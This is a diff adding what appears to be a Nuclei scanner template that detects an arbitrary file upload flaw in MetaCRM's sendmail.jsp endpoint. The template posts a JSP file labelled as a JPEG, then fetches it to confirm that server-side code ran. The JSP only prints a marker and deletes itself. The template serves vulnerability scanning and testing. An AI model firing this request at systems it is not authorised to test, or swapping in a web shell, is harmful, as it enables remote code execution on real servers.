@@ -1,0 +1,61 @@
+id: metacrm-sendmail-jsp-anyfile-upload
+
+info:
+  name: MetaCRM Sendmail.jsp Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,vulnerability
+  description: |
+    MetaCRM customer relationship management system is vulnerable to an arbitrary file upload via the sendmail.jsp endpoint, allowing attackers to upload JSP files and execute them on the server.
+
+variables:
+  t1: "{{rand_base(7)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/business/ums/sendmail.jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+    body: |
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      <% out.print("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "messageserv"
+          - ".jsp"
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        regex:
+          - "(?P<file>[0-9a-z]{32}).jsp"
+        internal: true
+  
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/userfile/messageserv/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
